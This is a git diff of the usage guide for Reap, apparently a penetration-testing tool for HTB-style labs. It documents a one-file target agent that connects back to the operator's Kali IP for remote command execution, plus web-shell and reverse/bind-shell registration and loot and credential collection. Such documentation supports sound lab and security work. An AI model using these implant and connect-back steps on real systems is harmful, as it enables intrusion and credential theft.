@@ -12,6 +12,8 @@ against discovered services, and gives you a ranked findings list + report.
 
 ---
 
+Connecting a shell from another tool? Use the [agent quickstart](AGENT_QUICKSTART.md).
+
 ## 1. Install (once per Kali)
 
 Reap requires Python 3.9 or newer. On Kali, install Git and Python's venv support:
@@ -47,15 +49,31 @@ Both installation modes are editable. Keep the source folder at its installed pa
 
 ### Transfer Reap to another Kali instance
 
-Choose a source archive when you only need to install and run Reap. Choose a Git bundle when you also want committed history, including commits that have not reached GitHub. A bundle transfers source history without contacting GitHub. Both methods still need dependency downloads during installation.
+For the one-file agent, use a prepared build that includes the ready-to-use target files. A Git source archive or bundle transfers source code and is useful for development, but does not include untracked target executables. All installation methods still need Python dependency downloads on Kali.
 
-#### Install from a source archive
+#### Install a prepared build with the agent
+
+Copy the prepared `reap-1.13.0.tar.gz` archive supplied with this build to Kali. On a fresh installation, after installing pipx as described above:
+
+```bash
+mkdir ~/reap
+tar -xzf /path/to/reap-1.13.0.tar.gz --strip-components=1 -C ~/reap
+cd ~/reap
+bash install.sh --pipx --full
+reap
+```
+
+Use a new directory. For an existing installation, follow the backup instructions below before applying an update. You do not install Go or build the target agent yourself.
+
+Once Reap opens, follow the [agent quickstart](AGENT_QUICKSTART.md).
+
+#### Create a source-only archive
 
 From the source repository on Windows or Linux:
 
 ```bash
 git status --short
-git archive --format=tar.gz --prefix=reap/ --output=../reap-1.11.0.tar.gz HEAD
+git archive --format=tar.gz --prefix=reap/ --output=../reap-source.tar.gz HEAD
 ```
 
 `HEAD` means the latest local commit. The archive excludes `.git`, uncommitted edits and untracked files. Review the status output and commit the source changes you intend to distribute first. `git ls-files` shows the tracked files that will be packaged; ignored files that were already committed remain tracked.
@@ -63,7 +81,7 @@ git archive --format=tar.gz --prefix=reap/ --output=../reap-1.11.0.tar.gz HEAD
 Transfer the archive by scp, USB or a shared folder. On a fresh Kali machine, after installing pipx as described above:
 
 ```bash
-tar -xzf /path/to/reap-1.11.0.tar.gz -C "$HOME"
+tar -xzf /path/to/reap-source.tar.gz -C "$HOME"
 cd ~/reap
 bash install.sh --pipx --full
 reap --help
@@ -124,7 +142,7 @@ For local-venv installations, use `bash install.sh --full` and `source ~/reap/.v
 
 If an older alias, shell function or activated venv masks a pipx command, inspect it with `type -a reap`. Deactivate the old venv and adjust the alias if you intend to use pipx. Do not transfer `.venv`, pipx environments, caches or build output between machines; reinstall for the destination's Python version. A fully offline install also needs dependency wheels compatible with that Python version and architecture. The source archive and Git bundle do not contain those wheels.
 
-These steps install the operator application. The target-side portable agent uses only its transferred kit and Python 3.9+; it does not need this repository, pipx or Reap's optional backends.
+These steps install Reap on Kali. The [one-file agent](AGENT_QUICKSTART.md) uses ready-to-use target executables included in a packaged Reap build. A Git source archive does not include untracked executables. For agent use on another Kali machine, transfer a packaged build that includes them; [developer packaging notes](native-agent/README.md) explain how maintainers prepare it. On the target, copy and run only the generated agent file.
 
 References: [Git source archives](https://git-scm.com/docs/git-archive), [Git bundles](https://git-scm.com/docs/git-bundle), [pipx installation options](https://pipx.pypa.io/stable/reference/cli.html).
 
@@ -152,6 +170,7 @@ have** (`register` auto-fingerprints OS / privilege / runtimes afterwards):
 | **Web shell** (HTTP RCE: a page that runs a command parameter) | `register webshell <url> [--param cmd] [--method POST]` |
 | Raw reverse shell (nc) | `register listen <port>` then fire your payload |
 | Raw bind shell | `register bind <host> <port>` |
+| Shell from another tool | `agent`, copy the generated file, then `agent listen` |
 
 ### "My shell isn't SSH" — read this
 
@@ -170,8 +189,7 @@ Match your situation:
 - **You caught (or will catch) a raw reverse/bind shell** → reap drives it directly, no
   `nc` in between. See "Raw reverse & bind shells" below for the full walkthrough.
 
-- **Windows shell that isn't WinRM** → get/enable WinRM creds and `register winrm`,
-  or drop a webshell on the IIS app and `register webshell`.
+- **A shell from another tool, including Windows** → use `agent` to make one file for the target. Copy it, run `agent listen` in Reap, then run that file in the target shell. See the [agent walkthrough](#connect-a-shell-from-another-tool-with-one-file).
 
 > **Rule of thumb:** web RCE → `webshell`; SSH/WinRM creds → `ssh`/`winrm`; a caught
 > reverse or bind shell → `listen`/`bind`. reap meets you at a *stable exec channel*.
@@ -227,37 +245,115 @@ stabilize in **pwncat-vl**, drop your key, then `register ssh`.
 
 ---
 
-### Portable agent for another tool's shell
+### Connect a shell from another tool with one file
 
-If your existing shell cannot be attached directly, create a kit and transfer its standalone agent through that access. Target Python 3.9+ is required.
+The agent connects an existing target shell to Reap. It runs as the account you already have. You do not install Go or Python on the target, and you do not copy separate password or certificate files.
 
-```text
-reap> agent prepare /tmp/reap-lab-kit
-reap> register agent-listen 7443 --bundle /tmp/reap-lab-kit --bind 0.0.0.0
-```
+The [agent quickstart](AGENT_QUICKSTART.md) is a short walkthrough you can keep beside your terminal.
 
-Copy `reap_agent.py`, `token.txt` and `fingerprint.txt` into a private `/tmp/reap-agent` directory on the target. Keep `key.pem` on the operator for connect-back mode. Run in the target shell:
+**1. On Kali, make the agent.** Open Reap:
 
 ```bash
-python3 /tmp/reap-agent/reap_agent.py --connect 10.10.14.2 --port 7443 \
-  --token-file /tmp/reap-agent/token.txt --fingerprint-file /tmp/reap-agent/fingerprint.txt
+reap
 ```
 
-Replace the IP with your reachable lab operator address. Reap verifies the token and the agent pins Reap's TLS certificate. The listener waits up to 60 seconds. Once registered, use `enum`, `ports`, `run`, `!id` or `interact`.
-
-For bind mode, also copy the kit's `cert.pem` and `key.pem` into the private target directory:
-
-```bash
-python3 /tmp/reap-agent/reap_agent.py --bind 0.0.0.0 --port 7443 \
-  --token-file /tmp/reap-agent/token.txt \
-  --cert /tmp/reap-agent/cert.pem --key /tmp/reap-agent/key.pem
-```
+At the `reap>` prompt:
 
 ```text
-reap> register agent 10.10.10.5 7443 --bundle /tmp/reap-lab-kit
+agent
 ```
 
-The agent runs in the foreground with the existing user's permissions, without persistence or a PTY. Reap exit or agent Ctrl-C closes it. Output is capped at 512 KiB per stream with explicit timeout/cap diagnostics. Remove target copies after use. [README: portable agent](README.md#attaching-a-shell-reap-cannot-directly-handle) covers authentication, cleanup and platform limits.
+Enter the IP address the target can use to reach Kali. In an HTB or similar VPN lab, this is usually your VPN address. For example, if Kali's VPN IP is `10.10.14.2`, enter `10.10.14.2`. Do not enter the target's IP.
+
+Choose the target type when asked. Choose Linux PC for a typical Linux VM, Linux ARM for an ARM machine, or Windows PC for Windows. Reap shows the file it created and the next commands.
+
+**2. Copy the one generated file to the target.** Use your existing shell or file transfer tool. The Linux file is named `reap-agent`; the Windows file is `reap-agent.exe`. Keep the filename when copying so the printed commands work as written.
+
+**3. On Kali, start the listener.** This tells Reap to wait for that file to connect:
+
+```text
+agent listen
+```
+
+**4. In the target shell, run the file.** For Linux, change to the directory where you copied it, then run:
+
+```bash
+chmod +x reap-agent
+./reap-agent
+```
+
+For Windows, run this in PowerShell in the directory where you copied the file:
+
+```powershell
+.\reap-agent.exe
+```
+
+Leave the agent running. When Reap reports a connection, continue in Reap:
+
+```text
+enum
+run
+```
+
+`enum` shows what is on the target. `run` collects loot and checks discovered credentials. `!whoami` runs a command on the connected target. Linux agents also support `ports --probe` to identify services on ports already discovered there; Windows service identification is not supported.
+
+Use `exit` at the `reap>` prompt to close Reap and its agent connection. Ctrl-C in the target shell also stops the agent. Delete the copied executable from the target when finished. It runs in the foreground and does not install a service or start itself after a reboot.
+
+### Agent options and saved setups
+
+Once you know your reachable IP, skip the questions:
+
+```text
+agent create 10.10.14.2
+```
+
+This creates a Linux PC agent named `reap-agent` in the directory where you started Reap. Reap will not replace an existing file. Reuse it with `agent listen`, or choose another filename with `--output` for a new setup.
+
+To choose a different kind of target:
+
+```text
+agent create 10.10.14.2 --target windows
+agent create 10.10.14.2 --target linux-arm64
+```
+
+Use `--output` to choose the generated file's path, or `--port` if you need a different listening port:
+
+```text
+agent create 10.10.14.2 --output /tmp/lab-agent
+agent create 10.10.14.2 --port 8443
+```
+
+Run the filename you actually copied. For the first example, that would be `chmod +x lab-agent` and `./lab-agent` on Linux. You do not add connection flags when running it; Reap has already put the correct settings inside the file.
+
+Reap keeps each setup on Kali under `~/.local/share/reap/agents`. A setup contains the private connection settings and is separate from the loot database. Leave it on Kali. Each new agent gets its own saved setup.
+
+| Command in Reap | What it does |
+|---|---|
+| `agent list` | show saved setups and their names |
+| `agent show` | show the latest setup's file and instructions |
+| `agent show NAME` | show instructions for a particular saved setup |
+| `agent listen` | wait for the latest setup to connect |
+| `agent listen NAME` | wait for a particular saved setup to connect |
+| `agent help` | show agent command help |
+
+Replace `NAME` with a name from `agent list`. Reopening Reap does not forget these setups. Keep using the setup that matches the file you copied, especially after creating more than one agent.
+
+### If the agent will not connect
+
+- **Reap says ready-to-run files are missing:** this installation contains source only. Install the [prepared build](#install-a-prepared-build-with-the-agent), which includes the target files.
+- **Reap stopped waiting:** the listener waits for 60 seconds. Run `agent listen` again, then run the target file. You can reuse the same file.
+- **The target says connection refused:** start `agent listen` on Kali first. Check that your chosen port is reachable.
+- **The connection times out:** check that the IP entered during setup is reachable from the target. In a VPN lab, use Kali's VPN IP. If you entered the wrong IP or port, create and copy a new agent.
+- **Linux says `Permission denied`:** run `chmod +x reap-agent`. If it still fails, move the file to a directory where execution is allowed.
+- **Linux says `Exec format error`:** you probably selected the wrong target type. Run `uname -m` in the target shell. `x86_64` means Linux PC; `aarch64` means Linux ARM. Create a new file for that type and copy it again.
+- **Reap says the agent file already exists:** use `agent show` to reuse it, or add `--output new-agent` when making a new setup.
+- **You created several agents:** use `agent list`, then `agent show NAME` and `agent listen NAME` for the setup matching the copied file.
+
+The agent needs a working shell on the target: `/bin/sh` on Linux or `cmd.exe` on Windows. It runs one command at a time and is suitable for commands that finish and return output. Terminal programs such as `vi` and interactive password prompts need a full terminal instead.
+
+### Advanced agent connections
+
+The older `agent prepare`, `register agent-listen`, and `register agent` commands remain available for manual Python agents and target-side listeners. They require more setup. Use the [developer and manual connection notes](native-agent/README.md) when you specifically need those modes.
 
 ## 4. The workflow (identical for every adapter)
 
@@ -357,7 +453,7 @@ reap> ports
 
 `ports` combines IPv4/IPv6 ss, netstat and procfs socket tables, preserving separate bind addresses, families, transports, processes and PIDs when available. It sees the session's network namespace. Restricted or missing sources appear in coverage. Reach loopback TCP ports with `forward 127.0.0.1 <port>` or `forward ::1 <port>` as displayed. UDP sockets are excluded from TCP correlation and auto-forwarding.
 
-`ports --probe` uses target-side Python on Linux to identify up to 12 discovered TCP listeners. It can show HTTP status/title/server/redirect, banners, TLS version and certificate fingerprint, with at most 64 KiB per response and a 55-second overall budget. Redirects are recorded without following them. It does not scan additional ports; TLS metadata does not verify service identity. Alternate-port HTTP becomes an observed lead. Failed requests, missing Python and caps remain visible.
+`ports --probe` and `enum --probe` use negotiated native probing for Linux native-agent sessions and target Python for other Linux sessions. They select 12 discovered TCP listeners by default (hard ceiling 24). Evidence includes HTTP status/title/server/redirect, banners, TLS version and certificate fingerprint. Native reads share 64 KiB per endpoint across attempts; the Python fallback caps each response at 64 KiB. Both have a 55-second overall budget. Redirects are recorded without following them; additional ports are not scanned. TLS metadata does not verify service identity. Failed requests and caps remain visible. Windows probing remains unsupported.
 
 ### `!<cmd>` and `interact` — a shell on the target
 
@@ -407,7 +503,10 @@ pwncat-vl for those.
 | `report [file.md] [redact]` | timeline + ranked findings to markdown (`redact` masks secrets) |
 | `export <creds\|hashes\|targets\|json> [path]` | password-only lists, per-mode hashes, targets, or JSON |
 | `show <id\|E1>` / `show snapshot <id>` | full finding, latest enum lead, or saved survey |
-| `agent prepare <new-directory>` | create the portable agent and TLS/token kit |
+| `agent` | guided setup: make one file to copy to the target |
+| `agent create <your-IP> [--target linux\|linux-arm64\|windows] [--output PATH] [--port N]` | make a target file without the setup questions |
+| `agent listen [NAME]` | wait for the latest agent, or choose a saved setup |
+| `agent list` / `agent show [NAME]` | list saved setups / show copy-and-run instructions |
 | `import <nmap.xml>` | seed services from an nmap scan |
 | `modules` | which modules match the active context |
 | `help` / `exit` | help / quit |
